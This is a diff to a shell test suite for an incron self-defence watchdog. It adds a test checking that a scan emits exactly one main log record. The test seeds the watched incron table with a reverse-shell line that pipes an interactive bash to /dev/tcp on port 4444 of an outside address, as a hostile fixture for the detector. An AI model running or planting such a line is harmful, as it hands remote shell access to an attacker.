@@ -287,3 +287,14 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
+    # Sister to brain-wide single-MAIN-logger-line INVARIANTs.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '/etc/nginx IN_MODIFY bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${TAB}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-incron -- ')
+    [ "${main_count}" = "1" ]
+}
